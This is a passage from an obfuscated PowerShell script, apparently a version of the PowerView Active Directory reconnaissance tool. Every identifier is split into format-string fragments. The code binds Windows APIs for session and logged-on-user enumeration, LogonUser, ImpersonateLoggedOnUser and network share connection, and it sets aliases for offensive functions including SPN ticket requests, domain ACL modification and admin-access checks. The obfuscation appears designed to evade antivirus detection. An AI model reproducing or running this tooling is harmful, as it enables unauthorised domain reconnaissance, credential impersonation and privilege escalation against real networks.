    ("{2}{1}{0}" -f'd','cte','Conne')    =    1
    ("{1}{3}{0}{2}"-f 'ctQ','C','uery','onne') =    2
    ("{1}{0}" -f 'dow','Sha')       =    3
    ("{2}{0}{1}" -f'con','nected','Dis') =    4
    ("{1}{0}" -f 'le','Id')         =    5
    ("{1}{0}{2}"-f 'iste','L','n')       =    6
    ("{1}{0}"-f 'set','Re')        =    7
    ("{1}{0}"-f'wn','Do')         =    8
    ("{0}{1}" -f 'Ini','t')         =    9
}


${wt`S`_sessiON_inf`O_1} = &("{0}{1}"-f 'str','uct') ${m`oD} ("{0}{4}{3}{2}{1}{5}"-f 'Po','I','ssion','.RDPSe','werView','nfo') @{
    ("{1}{0}"-f'xecEnvId','E') = &("{1}{0}"-f'ld','fie') 0 ("{1}{2}{0}" -f'2','UInt','3')
    ("{1}{0}"-f 'te','Sta') = &("{0}{1}"-f'fie','ld') 1 ${wTsCOn`NEct`St`Ate}
    ("{2}{1}{0}" -f'd','sionI','Ses') = &("{1}{0}" -f'eld','fi') 2 ("{1}{0}{2}" -f't','UIn','32')
    ("{1}{0}{3}{2}" -f 'sio','pSes','e','nNam') = &("{1}{0}" -f'ield','f') 3 ("{2}{1}{0}"-f'ing','tr','S') -MarshalAs @(("{1}{2}{0}"-f'tr','L','PWS'))
    ("{1}{0}{2}"-f'stNam','pHo','e') = &("{0}{1}" -f'fi','eld') 4 ("{0}{1}" -f'Stri','ng') -MarshalAs @(("{0}{1}"-f 'LPW','Str'))
    ("{0}{1}" -f 'p','UserName') = &("{1}{0}" -f'eld','fi') 5 ("{0}{1}" -f'St','ring') -MarshalAs @(("{1}{0}" -f'PWStr','L'))
    ("{0}{2}{1}"-f 'pD','ame','omainN') = &("{1}{0}"-f 'eld','fi') 6 ("{2}{1}{0}"-f 'g','trin','S') -MarshalAs @(("{0}{1}{2}" -f 'LP','WS','tr'))
    ("{0}{1}{2}{3}" -f'p','Farm','Na','me') = &("{1}{0}"-f'ld','fie') 7 ("{1}{0}" -f'ng','Stri') -MarshalAs @(("{0}{1}" -f 'LPWSt','r'))
}


${wT`S_cli`EN`T_adD`R`ess} = &("{1}{0}"-f 'uct','str') ${M`OD} ("{0}{2}{3}{1}{4}" -f 'WTS_','E','CLIENT_AD','DR','SS') @{
    ("{2}{1}{4}{0}{3}" -f'mi','es','Addr','ly','sFa') = &("{0}{1}" -f'fie','ld') 0 ("{0}{1}" -f 'UInt3','2')
    ("{2}{0}{1}"-f'ddres','s','A') = &("{1}{0}"-f'ield','f') 1 ("{0}{1}"-f 'Byt','e[]') -MarshalAs @(("{1}{3}{0}{2}" -f'rr','ByVa','ay','lA'), 20)
}


${S`HArE`_INfo_1} = &("{2}{0}{1}"-f 'uc','t','str') ${m`od} ("{0}{1}{2}{3}{4}{5}"-f'P','owerV','ie','w.Sha','reIn','fo') @{
    ("{0}{1}"-f'Na','me') = &("{1}{0}"-f'ield','f') 0 ("{1}{0}"-f'ing','Str') -MarshalAs @(("{1}{0}" -f 'r','LPWSt'))
    ("{0}{1}" -f 'Ty','pe') = &("{0}{1}"-f 'fie','ld') 1 ("{0}{1}{2}"-f'UI','nt3','2')
    ("{0}{1}" -f'Rem','ark') = &("{0}{1}"-f 'f','ield') 2 ("{0}{1}"-f'Stri','ng') -MarshalAs @(("{0}{1}"-f 'LPWS','tr'))
}


${WKs`Ta_`USeR_INf`o_1} = &("{0}{1}" -f 'stru','ct') ${m`oD} ("{3}{5}{4}{6}{1}{2}{0}"-f 'Info','U','ser','Powe','ge','rView.Log','dOn') @{
    ("{0}{2}{1}" -f'UserN','me','a') = &("{0}{1}" -f 'f','ield') 0 ("{1}{0}"-f 'ng','Stri') -MarshalAs @(("{1}{0}" -f 'PWStr','L'))
    ("{2}{1}{0}{3}"-f'D','ogon','L','omain') = &("{0}{1}"-f'fie','ld') 1 ("{0}{2}{1}" -f 'S','ing','tr') -MarshalAs @(("{1}{0}"-f'PWStr','L'))
    ("{1}{0}{2}"-f 'oma','AuthD','ins') = &("{1}{0}" -f 'd','fiel') 2 ("{1}{0}"-f 'ing','Str') -MarshalAs @(("{0}{1}"-f 'LPWSt','r'))
    ("{1}{0}{2}" -f 'gonServ','Lo','er') = &("{1}{0}"-f 'ld','fie') 3 ("{1}{0}"-f 'ng','Stri') -MarshalAs @(("{1}{0}" -f'Str','LPW'))
}


${Ses`S`ION_`i`NfO_`10} = &("{1}{0}" -f't','struc') ${m`od} ("{4}{5}{1}{3}{0}{2}"-f'Inf','ssio','o','n','P','owerView.Se') @{
    ("{1}{0}" -f 'ame','CN') = &("{0}{1}" -f'f','ield') 0 ("{0}{1}"-f'Stri','ng') -MarshalAs @(("{0}{2}{1}"-f'L','tr','PWS'))
    ("{1}{2}{0}" -f'me','UserN','a') = &("{0}{1}" -f'f','ield') 1 ("{1}{0}" -f 'tring','S') -MarshalAs @(("{0}{1}"-f'LP','WStr'))
    ("{0}{1}" -f 'Tim','e') = &("{1}{0}" -f'ld','fie') 2 ("{2}{0}{1}"-f'3','2','UInt')
    ("{2}{0}{1}" -f'leTi','me','Id') = &("{1}{0}"-f'd','fiel') 3 ("{1}{0}" -f'32','UInt')
}


${SID_`N`AM`e`_usE} = &("{0}{1}"-f 'p','senum') ${M`oD} ("{2}{1}{0}" -f 'SE','D_NAME_U','SI') ("{0}{1}{2}"-f'UIn','t','16') @{
    ("{0}{3}{1}{2}"-f 'Si','TypeU','ser','d')             = 1
    ("{3}{0}{2}{1}" -f'peGr','up','o','SidTy')            = 2
    ("{0}{2}{1}" -f'S','in','idTypeDoma')           = 3
    ("{1}{3}{2}{0}" -f'ias','Sid','ypeAl','T')            = 4
    ("{0}{3}{1}{2}{5}{4}{6}" -f'Si','l','K','dTypeWel','ownGro','n','up')   = 5
    ("{1}{4}{2}{3}{0}" -f 'ccount','Si','TypeDelete','dA','d')   = 6
    ("{0}{1}{2}" -f 'S','idTyp','eInvalid')          = 7
    ("{0}{2}{1}{3}" -f'S','ype','idT','Unknown')          = 8
    ("{2}{1}{3}{0}"-f 'Computer','d','Si','Type')         = 9
}


${loCaL`G`RoU`P_infO`_1} = &("{1}{0}" -f'truct','s') ${m`OD} ("{0}{3}{1}{2}"-f'LO','U','P_INFO_1','CALGRO') @{
    ("{1}{2}{0}"-f 'name','lgrp','i1_') = &("{1}{0}"-f 'ield','f') 0 ("{1}{0}" -f 'tring','S') -MarshalAs @(("{2}{1}{0}" -f'tr','PWS','L'))
    ("{2}{0}{3}{4}{1}" -f'g','nt','l','rpi1_co','mme') = &("{0}{1}"-f'fiel','d') 1 ("{1}{0}"-f 'g','Strin') -MarshalAs @(("{1}{0}" -f 'WStr','LP'))
}


${lO`Ca`lGRoUp_m`em`Be`RS`_i`NFO_2} = &("{0}{1}{2}" -f's','tru','ct') ${M`od} ("{2}{3}{1}{4}{0}" -f '_2','MBERS','LOCALGROUP_','ME','_INFO') @{
    ("{2}{1}{0}"-f 'i2_sid','grm','l') = &("{0}{1}"-f'fiel','d') 0 ("{2}{0}{1}" -f'Pt','r','Int')
    ("{3}{1}{2}{0}" -f'ge','grmi2_s','idusa','l') = &("{0}{1}" -f'fiel','d') 1 ${SId_`Nam`E_`UsE}
    ("{1}{3}{2}{4}{0}"-f 'name','lgrm','omain','i2_d','and') = &("{0}{1}" -f 'f','ield') 2 ("{0}{1}"-f'Stri','ng') -MarshalAs @(("{2}{1}{0}" -f'r','St','LPW'))
}


${Ds`d`OMAinFl`AG} = &("{0}{2}{1}"-f 'ps','um','en') ${M`oD} ("{0}{1}{3}{2}"-f'Ds','D','lags','omain.F') ("{1}{2}{0}"-f'32','UIn','t') @{
    ("{0}{2}{1}"-f 'IN','OREST','_F')       = 1
    ("{3}{1}{2}{4}{0}" -f 'OUND','IREC','T_','D','OUTB') = 2
    ("{0}{3}{1}{2}" -f 'TRE','OO','T','E_R')       = 4
    ("{1}{0}" -f 'MARY','PRI')         = 8
    ("{0}{1}{2}"-f'NA','TIVE_','MODE')     = 16
    ("{1}{0}{4}{2}{3}"-f 'RE','DI','NBO','UND','CT_I')  = 32
} -Bitfield
${D`SD`OmaiNTrU`StType} = &("{2}{0}{1}" -f'enu','m','ps') ${M`od} ("{3}{1}{2}{0}"-f 'pe','omain.Tru','stTy','DsD') ("{0}{1}"-f'UInt3','2') @{
    ("{1}{0}{2}" -f 'NLE','DOW','VEL')   = 1
    ("{1}{0}"-f 'LEVEL','UP')     = 2
    ("{0}{1}" -f'M','IT')         = 3
    ("{0}{1}" -f'D','CE')         = 4
}
${dS`DOMainT`RU`sTA`TtRIbuTes} = &("{0}{1}" -f 'psenu','m') ${m`oD} ("{4}{5}{0}{2}{3}{6}{1}" -f't','s','ribu','t','DsDomain.Tru','stAt','e') ("{1}{0}"-f'2','UInt3') @{
    ("{1}{2}{0}{3}"-f'NSITIV','NO','N_TRA','E')      = 1
    ("{3}{1}{0}{2}" -f'_ON','PLEVEL','LY','U')        = 2
    ("{1}{2}{0}" -f'DS','FIL','TER_SI')         = 4
    ("{2}{3}{1}{0}" -f'SITIVE','TRAN','FORES','T_')   = 8
    ("{3}{2}{4}{0}{1}" -f 'ZA','TION','ROSS_','C','ORGANI')  = 16
    ("{1}{3}{2}{0}" -f 'T','WITHIN','FORES','_')       = 32
    ("{5}{4}{3}{0}{1}{2}" -f 'AS_','EXTERN','AL','AT_','RE','T')   = 64
}


${d`s_`DO`MAIN_tRu`S`TS} = &("{1}{0}"-f'uct','str') ${M`OD} ("{2}{4}{5}{3}{1}{0}" -f'S','UST','DS','_TR','_DOM','AIN') @{
    ("{2}{4}{3}{1}{0}"-f'me','mainNa','Ne','o','tbiosD') = &("{1}{0}" -f'eld','fi') 0 ("{1}{0}" -f'ring','St') -MarshalAs @(("{0}{1}"-f'L','PWStr'))
    ("{3}{2}{1}{0}" -f 'e','m','DomainNa','Dns') = &("{1}{0}"-f'ield','f') 1 ("{0}{1}" -f 'S','tring') -MarshalAs @(("{1}{0}" -f 'WStr','LP'))
    ("{0}{1}"-f'Fla','gs') = &("{0}{1}"-f'f','ield') 2 ${DSD`o`MAINFl`Ag}
    ("{2}{1}{0}"-f'Index','arent','P') = &("{1}{0}" -f'ld','fie') 3 ("{0}{1}" -f 'UI','nt32')
    ("{1}{2}{0}" -f 'pe','Tru','stTy') = &("{1}{0}"-f 'ld','fie') 4 ${dS`dOm`AinTRUstTY`Pe}
    ("{2}{0}{1}{4}{3}" -f't','r','TrustAt','s','ibute') = &("{0}{1}" -f'fie','ld') 5 ${dSDoM`A`IntRU`S`T`A`TTriBUtEs}
    ("{1}{0}"-f'ainSid','Dom') = &("{0}{1}"-f 'fi','eld') 6 ("{1}{2}{0}"-f'r','In','tPt')
    ("{1}{2}{3}{0}"-f'Guid','Dom','ai','n') = &("{1}{0}"-f 'ld','fie') 7 ("{1}{0}"-f'id','Gu')
}


${NETrES`OUr`CeW} = &("{0}{1}" -f 'struc','t') ${M`OD} ("{1}{2}{3}{0}"-f'URCEW','N','ETRE','SO') @{
    ("{1}{2}{0}" -f'e','dw','Scop') =         &("{0}{1}"-f 'f','ield') 0 ("{0}{1}"-f'UInt3','2')
    ("{0}{1}" -f'dw','Type') =          &("{1}{0}" -f'ld','fie') 1 ("{0}{1}" -f 'UInt','32')
    ("{0}{1}{2}"-f 'dwDispl','ayTy','pe') =   &("{1}{0}" -f 'ld','fie') 2 ("{1}{0}" -f 'nt32','UI')
    ("{0}{1}" -f'dwU','sage') =         &("{0}{1}"-f'f','ield') 3 ("{2}{0}{1}" -f'In','t32','U')
    ("{1}{0}{2}{3}" -f 'ocal','lpL','N','ame') =     &("{0}{1}"-f'fi','eld') 4 ("{0}{1}" -f'Str','ing') -MarshalAs @(("{0}{1}" -f 'LPW','Str'))
    ("{0}{3}{1}{2}"-f 'lp','e','moteName','R') =    &("{1}{0}"-f 'eld','fi') 5 ("{0}{1}" -f'Strin','g') -MarshalAs @(("{0}{1}" -f'L','PWStr'))
    ("{0}{2}{1}" -f 'l','t','pCommen') =       &("{0}{1}" -f 'fi','eld') 6 ("{0}{1}" -f 'St','ring') -MarshalAs @(("{1}{0}" -f 'Str','LPW'))
    ("{1}{3}{2}{0}"-f 'der','lpPr','i','ov') =      &("{0}{1}"-f'fie','ld') 7 ("{2}{0}{1}" -f 't','ring','S') -MarshalAs @(("{1}{0}" -f 'tr','LPWS'))
}


${FuNCT`I`oNd`ef`ini`TiOns} = @(
    (&("{1}{0}" -f'unc','f') ("{1}{0}{2}" -f 'i3','netap','2') ("{0}{1}{2}{3}" -f 'N','et','Share','Enum') ([Int]) @([String], [Int],  (GET-VAriABLE ('kEg'+'SB')  -VALuEoNL  ).("{4}{0}{3}{1}{2}"-f 'ake','ef','Type','ByR','M').Invoke(), [Int],  ${sT5`hA}.("{4}{1}{2}{0}{3}" -f 'ByR','a','ke','efType','M').Invoke(),  ( VariABLE ("st5"+"HA") )."Va`Lue".("{0}{3}{2}{1}"-f 'Ma','Type','f','keByRe').Invoke(),  ${ST5`Ha}.("{1}{3}{0}{2}{4}" -f 'ByRefT','Mak','yp','e','e').Invoke())),
    (&("{1}{0}"-f'c','fun') ("{0}{2}{1}"-f'netapi','2','3') ("{4}{1}{3}{2}{0}" -f'rEnum','st','se','aU','NetWk') ([Int]) @([String], [Int],   (VariABLe ("{1}{0}" -f 'gSB','kE')  -vA).("{0}{3}{2}{1}" -f 'MakeB','pe','Ty','yRef').Invoke(), [Int],  ( geT-VARiAblE ('sT5H'+'A')  )."Va`LUe".("{2}{3}{0}{1}" -f'e','fType','Mak','eByR').Invoke(),  ${st`5`HA}.("{0}{2}{1}"-f'Mak','fType','eByRe').Invoke(),  (GeT-VarIaBle  ('sT5'+'ha')  -VAlUe ).("{1}{0}{3}{2}{4}"-f 'ak','M','p','eByRefTy','e').Invoke())),
    (&("{1}{0}"-f 'c','fun') ("{0}{2}{1}" -f'ne','api32','t') ("{0}{2}{1}" -f'NetSessionEn','m','u') ([Int]) @([String], [String], [String], [Int],   ${kE`gsb}.("{1}{4}{2}{3}{0}" -f'Type','Make','yR','ef','B').Invoke(), [Int],   ( gET-VaRIaBle  ("St5h"+"A")  -VALueon).("{1}{2}{0}{3}{4}"-f'eBy','Ma','k','Ref','Type').Invoke(),   (  gET-VARIablE ("ST"+"5HA")  -Va  ).("{3}{0}{2}{1}" -f'ByR','e','efTyp','Make').Invoke(),   ( gEt-VariAbLE  ("{1}{0}"-f'hA','st5')  )."VA`lue".("{0}{1}{3}{2}" -f'Mak','eB','ype','yRefT').Invoke())),
    (&("{0}{1}" -f 'fu','nc') ("{2}{0}{1}" -f'pi3','2','neta') ("{3}{1}{4}{2}{0}"-f'oupEnum','e','ocalGr','N','tL') ([Int]) @([String], [Int],   (VariabLe ("K"+"eGSB") )."val`Ue".("{0}{2}{1}{3}"-f 'M','efTyp','akeByR','e').Invoke(), [Int],   ${S`T5ha}.("{1}{4}{3}{2}{0}" -f'RefType','M','By','ke','a').Invoke(),  ( VaRiAbLe ('ST5H'+'a'))."va`LUE".("{1}{2}{0}{3}" -f 'k','M','a','eByRefType').Invoke(),  ( DIR  ("va"+"R"+"i"+"ABLe:ST5ha")  )."vAL`UE".("{2}{0}{1}"-f 'k','eByRefType','Ma').Invoke())),
    (&("{0}{1}"-f'fu','nc') ("{0}{1}{2}"-f 'net','ap','i32') ("{1}{4}{2}{5}{0}{3}" -f 'l','N','tLoc','GroupGetMembers','e','a') ([Int]) @([String], [String], [Int],  (  get-IteM  ("{2}{3}{1}{0}"-f 'KEgsb','AblE:','VAr','i') )."vA`LuE".("{3}{0}{2}{1}{4}" -f'keByRe','Typ','f','Ma','e').Invoke(), [Int],   (  DiR  ("{2}{1}{3}{0}" -f '5Ha','s','varIABle:','T') )."VaL`Ue".("{3}{0}{1}{2}{4}"-f'ak','e','B','M','yRefType').Invoke(),   (  vArIABLE ("{0}{1}" -f'st5h','a') -VaLU).("{1}{0}{3}{2}" -f 'ak','M','RefType','eBy').Invoke(),  (diR  ('VaRiaBLE'+':S'+'T5h'+'A'))."vAL`Ue".("{0}{1}{2}{3}" -f 'MakeBy','Re','fTy','pe').Invoke())),
    (&("{0}{1}" -f 'fun','c') ("{1}{2}{0}" -f '32','netap','i') ("{2}{1}{0}" -f 'Name','sGetSite','D') ([Int]) @([String],  ${K`eGsb}.("{3}{0}{2}{1}" -f 'T','e','yp','MakeByRef').Invoke())),
    (&("{0}{1}"-f 'fun','c') ("{0}{2}{1}"-f 'ne','pi32','ta') ("{2}{1}{3}{0}" -f'ts','rateD','DsEnume','omainTrus') ([Int]) @([String], [UInt32],   ${KeG`SB}.("{1}{0}{3}{2}"-f 'yRef','MakeB','pe','Ty').Invoke(),  ${keg`SB}.("{2}{1}{0}" -f 'pe','yRefTy','MakeB').Invoke())),
    (&("{0}{1}"-f'fun','c') ("{0}{1}{2}" -f 'n','e','tapi32') ("{2}{0}{1}{3}" -f'ApiBuf','ferFre','Net','e') ([Int]) @([IntPtr])),
    (&("{1}{0}" -f'c','fun') ("{1}{0}{2}"-f'dv','a','api32') ("{1}{4}{0}{3}{2}" -f 'ToStrin','Conv','Sid','g','ertSid') ([Int]) @([IntPtr],  ${l`Fj}.("{2}{3}{1}{0}" -f'pe','RefTy','Mak','eBy').Invoke()) -SetLastError),
    (&("{0}{1}"-f 'fu','nc') ("{1}{2}{0}"-f '2','a','dvapi3') ("{3}{1}{2}{0}" -f 'W','n','SCManager','Ope') ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (&("{1}{0}"-f 'nc','fu') ("{2}{0}{1}" -f'pi3','2','adva') ("{4}{1}{5}{3}{2}{0}"-f'viceHandle','s','r','Se','Clo','e') ([Int]) @([IntPtr])),
    (&("{0}{1}" -f 'fu','nc') ("{0}{1}" -f 'advap','i32') ("{0}{2}{1}"-f'Lo','nUser','go') ([Bool]) @([String], [String], [String], [UInt32], [UInt32],   ( CHiLDITEm  ("{0}{3}{2}{1}" -f'VA','eGSB','lE:K','riab') )."Va`Lue".("{1}{3}{2}{0}"-f 'e','MakeBy','Typ','Ref').Invoke()) -SetLastError),
    (&("{1}{0}" -f'c','fun') ("{2}{0}{1}"-f 'd','vapi32','a') ("{3}{2}{1}{4}{5}{0}"-f'OnUser','t','ona','Impers','eLogge','d') ([Bool]) @([IntPtr]) -SetLastError),
    (&("{1}{0}"-f 'nc','fu') ("{1}{0}" -f '32','advapi') ("{2}{1}{3}{0}" -f'f','vertTo','Re','Sel') ([Bool]) @() -SetLastError),
    (&("{1}{0}" -f'unc','f') ("{1}{0}{2}" -f'sap','wt','i32') ("{3}{2}{1}{0}"-f'verEx','nSer','SOpe','WT') ([IntPtr]) @([String])),
    (&("{0}{1}" -f'f','unc') ("{1}{0}" -f '2','wtsapi3') ("{3}{0}{4}{1}{2}{5}" -f'TSEnume','at','eSession','W','r','sEx') ([Int]) @([IntPtr],  ${sT`5`ha}.("{0}{2}{1}" -f 'Make','ype','ByRefT').Invoke(), [Int],  (  cHiLdItEM ('V'+'arIA'+'bL'+'E:keGS'+'b')  )."vA`Lue".("{1}{0}{3}{2}" -f'keByR','Ma','fType','e').Invoke(),  ${ST`5hA}.("{2}{1}{0}"-f'RefType','By','Make').Invoke()) -SetLastError),
    (&("{1}{0}" -f 'nc','fu') ("{2}{1}{0}"-f 'i32','ap','wts') ("{0}{2}{3}{4}{1}" -f'WTSQuery','mation','S','essionInfo','r') ([Int]) @([IntPtr], [Int], [Int],   ( LS  ("VaRIaB"+"l"+"e"+":KegSB") )."vaL`UE".("{1}{2}{0}"-f 'pe','MakeByRe','fTy').Invoke(),   (gEt-VaRiaBlE  ('sT5'+'ha')  -vaLu).("{3}{0}{2}{1}"-f'eBy','ype','RefT','Mak').Invoke()) -SetLastError),
    (&("{0}{1}" -f 'fu','nc') ("{1}{2}{0}" -f'2','wtsa','pi3') ("{2}{3}{1}{0}" -f'Ex','ory','WT','SFreeMem') ([Int]) @([Int32], [IntPtr], [Int32])),
    (&("{0}{1}" -f'fun','c') ("{1}{0}" -f'32','wtsapi') ("{0}{1}{2}"-f 'WTS','FreeMe','mory') ([Int]) @([IntPtr])),
    (&("{0}{1}" -f'fu','nc') ("{0}{2}{1}"-f 'wt','2','sapi3') ("{2}{0}{1}"-f'TSC','loseServer','W') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f 'nc','fu') ("{1}{0}"-f 'pr','M') ("{0}{3}{1}{2}" -f'WNetAddCo','o','n2W','nnecti') ([Int]) @(${NEtRE`S`ou`RCEW}, [String], [String], [UInt32])),
    (&("{1}{0}"-f 'c','fun') ("{0}{1}"-f'M','pr') ("{0}{3}{4}{2}{1}" -f 'W','ion2','Connect','NetCa','ncel') ([Int]) @([String], [Int], [Bool])),
    (&("{0}{1}"-f'fu','nc') ("{0}{2}{1}"-f'k','el32','ern') ("{1}{2}{0}"-f 'le','CloseHa','nd') ([Bool]) @([IntPtr]) -SetLastError)
)

${t`Y`PES} = ${fUn`cT`ion`dE`Fi`NiTiOnS} | &("{0}{2}{1}{3}"-f'A','d-Win32','d','Type') -Module ${m`od} -Namespace ("{0}{1}" -f'W','in32')
${NE`T`APi32} = ${t`yPES}[("{0}{1}{2}" -f 'n','etapi3','2')]
${adv`Ap`I32} = ${tY`peS}[("{1}{2}{0}" -f'2','adv','api3')]
${wt`SA`pi32} = ${T`Y`pES}[("{0}{1}{2}" -f 'wts','api','32')]
${m`PR} = ${Ty`PEs}['Mpr']
${k`ERNe`L32} = ${ty`p`ES}[("{0}{1}{2}"-f 'ker','ne','l32')]

&("{1}{3}{2}{0}"-f 'as','Set','li','-A') ("{2}{0}{1}{3}"-f'et-IP','Addr','G','ess') ("{2}{1}{3}{0}" -f'ess','e-I','Resolv','PAddr')
&("{0}{1}"-f'Set-Al','ias') ("{3}{2}{1}{0}{4}"-f'eTo','am','vert-N','Con','Sid') ("{1}{0}{2}{3}" -f 'rt','Conve','T','o-SID')
&("{0}{1}"-f'Set-Al','ias') ("{3}{1}{0}{2}"-f'To','ert-Sid','Name','Conv') ("{0}{2}{1}{3}"-f 'Conv','m','ertFro','-SID')
&("{0}{2}{1}" -f 'Se','as','t-Ali') ("{2}{1}{4}{3}{0}"-f 'ket','ues','Req','-SPNTic','t') ("{1}{5}{2}{0}{4}{3}"-f 'PNTic','Get-Do','S','et','k','main')
&("{1}{0}{2}{3}"-f'-','Set','Ali','as') ("{1}{3}{0}{2}" -f'n','Get','e','-DNSZo') ("{2}{0}{4}{1}{3}" -f 'et-Dom','inDNSZon','G','e','a')
&("{2}{1}{0}"-f'Alias','-','Set') ("{0}{1}{2}{3}"-f 'Get-','D','NS','Record') ("{5}{2}{4}{0}{1}{3}" -f'R','ecor','t-D','d','omainDNS','Ge')
&("{0}{1}{3}{2}"-f'Set-','A','s','lia') ("{0}{2}{1}"-f 'Get-','Domain','Net') ("{2}{0}{1}" -f't-Doma','in','Ge')
&("{0}{2}{1}" -f 'Se','-Alias','t') ("{4}{2}{1}{0}{5}{3}"-f 'oma','tD','e','ontroller','Get-N','inC') ("{3}{2}{1}{4}{0}" -f'er','o','DomainContr','Get-','ll')
&("{2}{1}{0}" -f 'as','li','Set-A') ("{1}{3}{0}{2}"-f 'or','Get-Ne','est','tF') ("{2}{3}{0}{1}"-f 'Fores','t','Ge','t-')
&("{0}{2}{1}"-f'Set-Ali','s','a') ("{3}{0}{4}{1}{2}"-f 't-','ore','stDomain','Ge','NetF') ("{3}{0}{2}{1}" -f'Fo','ain','restDom','Get-')
&("{2}{1}{0}{3}" -f'-Al','t','Se','ias') ("{3}{2}{4}{1}{0}" -f'log','Cata','-Net','Get','Forest') ("{5}{3}{1}{4}{0}{2}{6}" -f'o','st','bal','-Fore','Gl','Get','Catalog')
&("{1}{0}{2}{3}"-f'-','Set','Alia','s') ("{0}{2}{1}" -f'G','NetUser','et-') ("{2}{3}{4}{0}{1}"-f'Us','er','Get-Doma','i','n')
&("{2}{0}{1}"-f'et-','Alias','S') ("{0}{2}{4}{3}{1}" -f'G','vent','et','rE','-Use') ("{3}{0}{2}{1}" -f'-Dom','nt','ainUserEve','Get')
&("{0}{1}" -f 'Set-Ali','as') ("{1}{2}{0}{3}"-f 'mpute','Get-','NetCo','r') ("{2}{4}{3}{1}{0}" -f'uter','p','Get','om','-DomainC')
&("{0}{1}{2}"-f 'Se','t-Alia','s') ("{2}{1}{0}" -f'bject','ADO','Get-') ("{2}{1}{0}{4}{3}"-f'nO','ai','Get-Dom','t','bjec')
&("{0}{2}{1}" -f 'S','Alias','et-') ("{0}{2}{1}{3}"-f 'Set-AD','e','Obj','ct') ("{4}{1}{2}{0}{3}"-f'inObj','m','a','ect','Set-Do')
&("{0}{2}{1}" -f'Set-Ali','s','a') ("{2}{0}{1}" -f '-ObjectAc','l','Get') ("{0}{1}{2}{3}"-f 'Get-Dom','ainObject','A','cl')
&("{0}{1}" -f 'Set-Ali','as') ("{0}{1}{2}" -f'Add-Objec','tAc','l') ("{0}{2}{1}{3}"-f 'A','d-DomainObj','d','ectAcl')
&("{2}{1}{0}"-f 's','t-Alia','Se') ("{2}{3}{0}{1}"-f 'n','ner','Invoke-AC','LSca') ("{1}{6}{2}{5}{7}{3}{0}{4}" -f'D','Find','In','ng','omainAcl','te','-','resti')
&("{1}{0}{2}"-f 'et-Al','S','ias') ("{0}{1}{2}"-f'Get-','GUIDMa','p') ("{0}{3}{2}{4}{1}{5}" -f 'Get-D','IDM','n','omai','GU','ap')
&("{2}{0}{1}" -f 'et-Ali','as','S') ("{2}{1}{0}" -f'OU','-Net','Get') ("{1}{0}{2}{3}"-f 't','Ge','-Doma','inOU')
&("{0}{1}{2}" -f'Set-Al','i','as') ("{1}{2}{3}{0}" -f'ite','Ge','t-N','etS') ("{0}{3}{1}{2}" -f 'Get-Dom','Si','te','ain')
&("{1}{0}{2}" -f'l','Set-A','ias') ("{1}{0}{2}{3}"-f'-NetSub','Get','ne','t') ("{0}{4}{1}{3}{2}"-f 'Get-D','mainS','et','ubn','o')
&("{0}{2}{1}" -f 'Se','as','t-Ali') ("{2}{1}{0}{3}"-f'-NetGro','t','Ge','up') ("{2}{4}{1}{3}{0}"-f'nGroup','oma','Get-','i','D')
&("{1}{0}"-f'ias','Set-Al') ("{1}{2}{3}{5}{4}{0}"-f'ityGroups','Fi','nd-Ma','nagedSe','r','cu') ("{3}{0}{2}{4}{6}{5}{1}{7}"-f'nMan','rityG','a','Get-Domai','ged','cu','Se','roup')
&("{0}{1}" -f'Se','t-Alias') ("{3}{0}{1}{4}{2}"-f'et-NetG','r','upMember','G','o') ("{2}{3}{1}{0}"-f'upMember','ainGro','Get-','Dom')
&("{1}{2}{0}" -f's','Set','-Alia') ("{1}{2}{4}{0}{3}" -f 'r','G','e','ver','t-NetFileSe') ("{2}{5}{4}{3}{1}{0}"-f'er','erv','Ge','S','nFile','t-Domai')
&("{1}{0}{2}" -f'-','Set','Alias') ("{1}{3}{0}{2}"-f'-DFSsh','Ge','are','t') ("{1}{2}{0}{3}"-f 'FSSha','Get-D','omainD','re')
&("{2}{1}{0}"-f 'as','et-Ali','S') ("{0}{2}{3}{1}"-f'Ge','GPO','t-','Net') ("{2}{1}{3}{0}"-f'ainGPO','et-Do','G','m')
&("{0}{1}" -f 'S','et-Alias') ("{1}{3}{2}{0}"-f '-NetGPOGroup','G','t','e') ("{2}{5}{0}{3}{1}{4}"-f'ai','lGr','Get-','nGPOLoca','oup','Dom')
&("{1}{0}{2}" -f 'e','S','t-Alias') ("{0}{2}{3}{1}"-f 'Fin','ation','d-G','POLoc') ("{4}{2}{1}{5}{6}{8}{3}{7}{0}" -f 'g','m','Do','p','Get-','ain','GPOUserLoc','Mappin','alGrou')
&("{2}{1}{0}"-f 's','a','Set-Ali') ("{1}{4}{5}{2}{3}{0}" -f'in','Find','u','terAdm','-GPOCom','p') ("{1}{6}{0}{5}{4}{3}{7}{2}" -f'-DomainGP','G','g','Gr','uterLocal','OComp','et','oupMappin')
&("{2}{1}{0}" -f 's','t-Alia','Se') ("{3}{4}{1}{2}{0}" -f'Local','Logged','On','G','et-') ("{2}{4}{3}{0}{1}" -f'g','edOn','Ge','RegLog','t-')
&("{1}{0}{3}{2}" -f 'e','S','s','t-Alia') ("{1}{5}{2}{4}{0}{3}"-f 'inAcce','Invo','CheckLo','ss','calAdm','ke-') ("{2}{3}{0}{4}{1}" -f'mi','ss','T','est-Ad','nAcce')
&("{3}{2}{1}{0}"-f 'lias','t-A','e','S') ("{1}{2}{3}{0}"-f 'e','Get-Si','t','eNam') ("{3}{4}{2}{1}{0}" -f'e','eNam','Sit','Get-N','etComputer')
&("{2}{0}{1}"-f 'Al','ias','Set-') ("{0}{1}" -f 'Get-Prox','y') ("{2}{0}{1}"-f '-WMIRegProx','y','Get')
&("{2}{0}{1}" -f'-A','lias','Set') ("{3}{2}{0}{1}" -f'tLo','ggedOn','Las','Get-') ("{0}{3}{4}{2}{1}{5}" -f 'Ge','stLo','RegLa','t-','WMI','ggedOn')
&("{1}{0}{2}"-f'et-Al','S','ias') ("{4}{3}{0}{7}{5}{2}{1}{6}"-f 'a','ect','PConn','-C','Get','D','ion','chedR') ("{0}{5}{4}{3}{2}{1}" -f'G','ion','achedRDPConnect','C','t-WMIReg','e')
&("{0}{1}"-f'Set-Alia','s') ("{5}{1}{0}{3}{2}{4}{6}" -f'tryMoun','is','edDr','t','iv','Get-Reg','e') ("{3}{0}{4}{5}{6}{2}{1}" -f 'Reg','ive','dDr','Get-WMI','Mo','unt','e')
&("{2}{1}{0}" -f'ias','l','Set-A') ("{2}{1}{0}"-f 'ss','t-NetProce','Ge') ("{2}{1}{0}"-f 'ocess','WMIPr','Get-')
